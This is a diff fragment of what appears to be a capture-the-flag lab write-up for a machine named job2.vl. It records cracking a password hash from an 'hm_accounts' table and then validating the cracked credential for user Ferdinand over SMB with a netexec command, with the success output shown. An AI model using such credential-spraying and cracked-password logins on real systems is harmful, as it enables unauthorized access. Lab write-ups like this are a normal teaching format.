@@ -368,4 +368,16 @@ Then i can grab the hashes from `hm_accounts`
 
 One of the hashes cracked
 
-This is for the u
+This is for the user `ferdinand`
+
+# Compromising `ferdinand`
+
+```python
+❯❯❯ nxc smb job2.vl -u 'Ferdinand' -p 'Franzi123!'
+SMB         10.129.238.35   445    JOB2             [*] Windows Server 2022 Build 20348 x64 (name:JOB2) (domain:JOB2) (signing:True) (SMBv1:None)
+SMB         10.129.238.35   445    JOB2             [+] JOB2\Ferdinand:Franzi123! 
+```
+
+This user is now compromised
+
+
